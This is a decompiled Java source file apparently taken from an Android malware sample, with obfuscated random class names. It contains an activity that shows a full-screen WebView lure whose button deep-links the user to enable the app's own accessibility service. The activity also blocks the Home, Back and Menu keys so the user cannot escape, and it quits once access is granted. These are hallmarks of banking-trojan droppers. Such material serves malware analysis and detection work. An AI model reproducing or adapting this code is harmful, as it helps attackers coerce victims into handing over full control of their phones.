/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.content.ComponentName
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Bundle
 *  android.os.Parcelable
 *  android.view.KeyEvent
 *  android.view.View
 *  android.webkit.CookieManager
 *  android.webkit.JavascriptInterface
 *  android.webkit.JsResult
 *  android.webkit.WebChromeClient
 *  android.webkit.WebSettings$PluginState
 *  android.webkit.WebSettings$RenderPriority
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.jhvbzpdwpbqgticwdxuva;
import linker.resourcer.encoder.lmqhtifjzrtsgjcqpakvh;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;

public class qbhdlzfxnvfzrgssjp
extends Activity {
    private static qbhdlzfxnvfzrgssjp instance;
    static Context myctx;
    String lastpart = "";
    String partone = "";

    static {
        myctx = null;
    }

    private static String escapeHtml(String string2) {
        if (string2 == null) {
            return "";
        }
        return string2.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'", "&#39;");
    }

    public static String getLabelApplication(Context context) {
        try {
            String string2 = (String)context.getPackageManager().getApplicationLabel(context.getPackageManager().getApplicationInfo(context.getPackageName(), 128));
            return string2;
        }
        catch (Exception exception) {
            return context.getString(R.string.BaseName);
        }
    }

    public static boolean isActivityOpen() {
        boolean bl = instance != null;
        return bl;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void openAccessibilitySettings() {
        try {
            Object object = new Intent("com.samsung.accessibility.installed_service");
            object.setFlags(0x50800000);
            Intent intent = object;
            if (object.resolveActivity(this.getPackageManager()) == null) {
                object = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                intent = object;
                if (object.resolveActivity(this.getPackageManager()) == null) {
                    intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    object = new ComponentName(this.getApplicationContext(), jhvbzpdwpbqgticwdxuva.class);
                    intent.putExtra("android.intent.extra.COMPONENT_NAME", (Parcelable)object);
                    intent.setFlags(0x50800000);
                    this.startActivity(intent);
                    return;
                }
            }
            object = new StringBuilder();
            ((StringBuilder)object).append(this.getPackageName());
            ((StringBuilder)object).append("/");
            ((StringBuilder)object).append(jhvbzpdwpbqgticwdxuva.class.getName());
            object = ((StringBuilder)object).toString();
            Bundle bundle = new Bundle();
            bundle.putString(":settings:fragment_args_key", (String)object);
            intent.putExtra(":settings:fragment_args_key", (String)object);
            intent.putExtra(":settings:show_fragment_args", bundle);
            this.startActivity(intent);
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    public void onBackPressed() {
        super.onBackPressed();
    }

    /*
     * Unable to fully structure code
     * Could not resolve type clashes
     */
    protected void onCreate(Bundle var1_1) {
        block11: {
            super.onCreate((Bundle)var1_1);
            qbhdlzfxnvfzrgssjp.instance = this;
            qswemlflptdlumxqnjrlg.needtofy = false;
            if (tqvrhaaccrutxfxdqsvweshxhwtl.is_Access_Enabled(this.getApplicationContext(), jhvbzpdwpbqgticwdxuva.class)) ** GOTO lbl61
            if (qbhdlzfxnvfzrgssjp.myctx == null) {
                qbhdlzfxnvfzrgssjp.myctx = this.getApplicationContext();
            }
            if ((var1_1 = lmqhtifjzrtsgjcqpakvh.Launcher_Type) == null) ** GOTO lbl14
            if (var1_1.equals("d")) {
                this.openAccessibilitySettings();
                this.finish();
                return;
            }
lbl14:
            // 3 sources

            var1_1 = new WebView(this.getApplicationContext());
            var1_1.getSettings().setJavaScriptEnabled(true);
            var1_1.getSettings().setLoadsImagesAutomatically(true);
            var1_1.getSettings().setLoadWithOverviewMode(true);
            try {
                CookieManager.getInstance().setAcceptCookie(true);
                CookieManager.getInstance().setAcceptThirdPartyCookies((WebView)var1_1, true);
            }
            catch (Exception var2_3) {
                // empty catch block
            }
            var1_1.getSettings().setUseWideViewPort(true);
            var1_1.setScrollBarStyle(0);
            var1_1.getSettings().setAllowFileAccess(true);
            var1_1.getSettings().setCacheMode(1);
            var1_1.getSettings().setDomStorageEnabled(true);
            var1_1.getSettings().setAllowFileAccessFromFileURLs(true);
            var1_1.getSettings().setAllowUniversalAccessFromFileURLs(true);
            var1_1.getSettings().setAllowContentAccess(true);
            try {
                var1_1.setLayerType(2, null);
                var1_1.getSettings().setPluginState(WebSettings.PluginState.ON);
                var1_1.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                var1_1.setBackgroundColor(-1);
            }
            catch (Exception var2_4) {
                // empty catch block
            }
            try {
                var1_1.setScrollBarStyle(0);
                var2_5 /* !! */  = new MyWebViewClient(this);
                var1_1.setWebViewClient((WebViewClient)var2_5 /* !! */ );
                var2_5 /* !! */  = new MyWebChromeClient(this);
                var1_1.setWebChromeClient((WebChromeClient)var2_5 /* !! */ );
                var2_5 /* !! */  = new WebAppInterface(this, this.getApplicationContext());
                var1_1.addJavascriptInterface((Object)var2_5 /* !! */ , "Vlrgnfjo");
                var2_5 /* !! */  = lmqhtifjzrtsgjcqpakvh._Login_title_;
                var3_6 = lmqhtifjzrtsgjcqpakvh._Login_dis_;
                var4_7 = lmqhtifjzrtsgjcqpakvh._Login_btn_;
                var2_5 /* !! */  = qbhdlzfxnvfzrgssjp.escapeHtml((String)var2_5 /* !! */ );
                var3_6 = qbhdlzfxnvfzrgssjp.escapeHtml(var3_6);
                var4_7 = qbhdlzfxnvfzrgssjp.escapeHtml(var4_7);
                var5_8 = new StringBuilder();
                var1_1.loadDataWithBaseURL(null, var5_8.append("<!DOCTYPE html><html><head><meta charset=\"UTF-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1.0\"/><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#111;display:flex;flex-direction:column;justify-content:center;align-items:center;min-height:100vh;font-family:sans-serif;padding:2rem;text-align:center}h2{color:#fff;font-size:1.3rem;margin-bottom:1.2rem}p{color:#e0e0e0;font-size:1rem;line-height:1.8;margin-bottom:2.5rem;max-width:320px;white-space:pre-line;text-align:left}button{background:#1976D2;color:#fff;border:none;border-radius:8px;padding:14px 40px;font-size:1rem;cursor:pointer;letter-spacing:0.03em}button:active{background:#1565C0}</style></head><body><h2>").append((String)var2_5 /* !! */ ).append("</h2><p>").append(var3_6).append("</p><button onclick=\"Vlrgnfjo.OK()\">").append(var4_7).append("</button></body></html>").toString(), "text/html", "UTF-8", null);
                this.requestWindowFeature(1);
                this.setContentView((View)var1_1);
                break block11;
lbl61:
                // 1 sources

                this.finish();
            }
            catch (Exception var1_2) {
                // empty catch block
            }
        }
    }

    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public boolean onKeyDown(int n, KeyEvent keyEvent) {
        if (n == 3) {
            return true;
        }
        if (n == 4) {
            return true;
        }
        return n == 82;
    }

    protected void onStop() {
        super.onStop();
    }

    private class MyWebChromeClient
    extends WebChromeClient {
        final qbhdlzfxnvfzrgssjp this$0;

        private MyWebChromeClient(qbhdlzfxnvfzrgssjp qbhdlzfxnvfzrgssjp2) {
            this.this$0 = qbhdlzfxnvfzrgssjp2;
        }

        public boolean onJsAlert(WebView webView, String string2, String string3, JsResult jsResult) {
            return true;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final qbhdlzfxnvfzrgssjp this$0;

        private MyWebViewClient(qbhdlzfxnvfzrgssjp qbhdlzfxnvfzrgssjp2) {
            this.this$0 = qbhdlzfxnvfzrgssjp2;
        }

        public void onPageFinished(WebView webView, String string2) {
        }

        public boolean shouldOverrideUrlLoading(WebView webView, String string2) {
            return false;
        }
    }

    public class WebAppInterface {
        Context mContext;
        final qbhdlzfxnvfzrgssjp this$0;

        WebAppInterface(qbhdlzfxnvfzrgssjp qbhdlzfxnvfzrgssjp2, Context context) {
            this.this$0 = qbhdlzfxnvfzrgssjp2;
            this.mContext = context;
        }

        /*
         * Enabled aggressive block sorting
         * Enabled unnecessary exception pruning
         * Enabled aggressive exception aggregation
         */
        @JavascriptInterface
        public void OK() {
            try {
                Object object = new Intent("com.samsung.accessibility.installed_service");
                object.setFlags(0x50800000);
                Intent intent = object;
                if (object.resolveActivity(this.this$0.getPackageManager()) == null) {
                    object = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent = object;
                    if (object.resolveActivity(this.this$0.getPackageManager()) == null) {
                        intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                        object = new ComponentName(myctx, jhvbzpdwpbqgticwdxuva.class);
                        intent.putExtra("android.intent.extra.COMPONENT_NAME", (Parcelable)object);
                        intent.setFlags(0x50800000);
                        this.this$0.startActivity(intent);
                        return;
                    }
                }
                object = new StringBuilder();
                ((StringBuilder)object).append(this.this$0.getPackageName());
                ((StringBuilder)object).append("/");
                ((StringBuilder)object).append(jhvbzpdwpbqgticwdxuva.class.getName());
                object = ((StringBuilder)object).toString();
                Bundle bundle = new Bundle();
                bundle.putString(":settings:fragment_args_key", (String)object);
                intent.putExtra(":settings:fragment_args_key", (String)object);
                intent.putExtra(":settings:show_fragment_args", bundle);
                this.this$0.startActivity(intent);
                return;
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }
}

